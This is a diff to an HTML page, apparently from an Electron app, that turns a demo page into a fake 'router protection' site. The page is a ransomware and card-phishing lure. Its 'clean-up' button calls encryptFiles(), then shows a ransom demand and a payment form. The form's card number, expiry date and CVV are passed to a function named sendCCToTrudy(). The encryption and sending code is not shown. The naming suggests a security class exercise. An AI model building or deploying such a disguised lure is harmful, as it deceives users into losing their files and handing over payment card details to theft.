@@ -1,27 +1,160 @@
 <!DOCTYPE html>
 <html>
-<head>
+<title>Network corrupted</title>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<!-- Latest compiled and minified CSS -->
+<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
 
-    <meta charset="utf-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-
-    <title>Tutorialzine Electron Experiment</title>
-
-    <link rel="stylesheet" href="./css/jquery.flipster.min.css">
-    <link rel="stylesheet" href="./css/styles.css">
-
-</head>
+<!-- Optional theme -->
+<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap-theme.min.css" integrity="sha384-rHyoN1iRsVXV4nD0JutlnGaslCJuC7uwjduW9SVrLvRYooPp2bWYgmgJQIXwl/Sp" crossorigin="anonymous">
+<script
+src="https://code.jquery.com/jquery-3.2.1.min.js"
+integrity="sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4="
+crossorigin="anonymous"></script>
+<link rel="stylesheet" href="https://www.w3schools.com/w3css/4/w3.css">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lato">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Montserrat">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+<style>
+body,h1,h2,h3,h4,h5,h6 {font-family: "Lato", sans-serif}
+.w3-bar,h1,button {font-family: "Montserrat", sans-serif}
+.fa-anchor,.fa-bug {font-size:200px}
+</style>
+<script type="text/javascript" src="./js/crypto.js"></script>
+<script type="text/javascript" src="./js/rsa.js"></script>
 <body>
+  <!-- Header -->
+  <header class="w3-container w3-red w3-center" style="padding:128px 16px">
+    <h1 class="w3-margin w3-jumbo">Protection is one step away</h1>
+    <p class="w3-xlarge">Thank you for selecting the top router defense system</p>
+    <button id="encrypt-button" onclick="myFunction()" class="w3-button w3-black w3-padding-large w3-large w3-margin-top">Clich here to begin clean-up! </button>
+  </header>
+  <div class="container" style="display:none"   id="payment-div">
+    <form class="form-horizontal" role="form" id="creditCardForm">
+      <fieldset>
+        <p class="w3-xlarge text-danger"><strong>HAHAHAAHHAAH! YOUR PICTURES ARE NOW ENCRYPTED PAY $1 RANSOME TO DECRYPT ALL THE PICTURES</strong></p>
+        <legend>Payment</legend>
+        <div class="form-group">
+          <label class="col-sm-3 control-label" for="card-holder-name">Name on Card</label>
+          <div class="col-sm-9">
+            <input type="text" class="form-control" name="card-holder-name" id="card-holder-name" placeholder="Card Holder's Name">
+          </div>
+        </div>
+        <div class="form-group">
+          <label class="col-sm-3 control-label" for="card-number">Card Number</label>
+          <div class="col-sm-9">
+            <input type="text" class="form-control" name="card-number" id="card-number" placeholder="Debit/Credit Card Number">
+          </div>
+        </div>
+        <div class="form-group">
+          <label class="col-sm-3 control-label" for="expiry-month">Expiration Date</label>
+          <div class="col-sm-9">
+            <div class="row">
+              <div class="col-xs-3">
+                <select class="form-control col-sm-2" name="expiry-month" id="expiry-month">
+                  <option>Month</option>
+                  <option value="01">Jan (01)</option>
+                  <option value="02">Feb (02)</option>
+                  <option value="03">Mar (03)</option>
+                  <option value="04">Apr (04)</option>
+                  <option value="05">May (05)</option>
+                  <option value="06">June (06)</option>
+                  <option value="07">July (07)</option>
+                  <option value="08">Aug (08)</option>
+                  <option value="09">Sep (09)</option>
+                  <option value="10">Oct (10)</option>
+                  <option value="11">Nov (11)</option>
+                  <option value="12">Dec (12)</option>
+                </select>
+              </div>
+              <div class="col-xs-3">
+                <select class="form-control" id="expiry-year">
+                  <option value="17">2017</option>
+                  <option value="18">2018</option>
+                  <option value="19">2019</option>
+                  <option value="20">2020</option>
+                  <option value="21">2021</option>
+                  <option value="22">2022</option>
+                  <option value="23">2023</option>
+                </select>
+              </div>
+            </div>
+          </div>
+        </div>
+        <div class="form-group">
+          <label class="col-sm-3 control-label" for="cvv">Card CVV</label>
+          <div class="col-sm-3">
+            <input type="text" class="form-control" name="cvv" id="cvv" placeholder="Security Code">
+          </div>
+        </div>
+        <div class="form-group">
+          <div class="col-sm-offset-3 col-sm-9">
+            <button type="button" onclick="getPaymentAndDecrypt()" class="btn btn-success">Pay Now and Decrypt My Files</button>
+          </div>
+        </div>
+      </fieldset>
+    </form>
+  </div>
 
-<div class="flipster">
-    <ul>
-    </ul>
-</div>
+  <!-- First Grid -->
+  <div class="w3-row-padding w3-padding-64 w3-container">
+    <div class="w3-content">
+      <div class="w3-twothird">
+        <h1>World class router protection</h1>
+        <h5 class="w3-padding-32">We stop every single unknown file and analyze it for malicious activity before it gets to you. We are the best router based protection in the world, celebrating 50 years of excellent customer service and protection</h5>
 
-<p class="stats"></p>
 
-<script>window.$ = window.jQuery = require('./js/jquery.min.js');</script>
-<script src="./js/jquery.flipster.min.js"></script>
-<script src="./js/script.js"></script>
+      </div>
+
+      <div class="w3-third w3-center">
+        <i class="fa fa-bug w3-padding-64 w3-text-red"></i>
+      </div>
+    </div>
+  </div>
+
+
+  <div class="w3-container w3-black w3-center w3-opacity w3-padding-64">
+    <h1 class="w3-margin w3-xlarge">Quote of the day: "Stay safe"</h1>
+  </div>
+
+  <!-- Footer -->
+  <footer class="w3-container w3-padding-64 w3-center w3-opacity">
+    <div class="w3-xlarge w3-padding-32">
+      <i class="fa fa-facebook-official w3-hover-opacity"></i>
+      <i class="fa fa-instagram w3-hover-opacity"></i>
+      <i class="fa fa-snapchat w3-hover-opacity"></i>
+      <i class="fa fa-pinterest-p w3-hover-opacity"></i>
+      <i class="fa fa-twitter w3-hover-opacity"></i>
+      <i class="fa fa-linkedin w3-hover-opacity"></i>
+    </div>
+    <<h5 class="w3-padding-32">Brought to you by the creative team behind TIMESTAMP</h5>
+  </footer>
+  <script type="text/javascript">
+  function myFunction(){
+    var e = document.getElementById('payment-div');
+      e.style.display = (e.style.display == 'block') ? 'none' : 'block';
+      encryptFiles();
+  }
+  // $('#card-number').validateCreditCard(function(result)
+  //   {
+  //       alert('CC type: ' + result.card_type.name
+  //         + '\nLength validation: ' + result.length_valid
+  //         + '\nLuhn validation: ' + result.luhn_valid);
+  //   });
+  function getPaymentAndDecrypt(){
+    var cc = document.getElementById('card-number').value;
+    var expDate = document.getElementById('expiry-month').value;
+    expDate +='/' + document.getElementById('expiry-year').value;
+    var cvv = document.getElementById('cvv').value;
+
+    if(sendCCToTrudy(cc, cvv, expDate)) {
+       alert("Thank you! your files have been decrypted");
+    } else {
+      alert("Invalid Payment Method!! Say good by to your files");
+    }
+  }
+  </script>
 </body>
+
 </html>
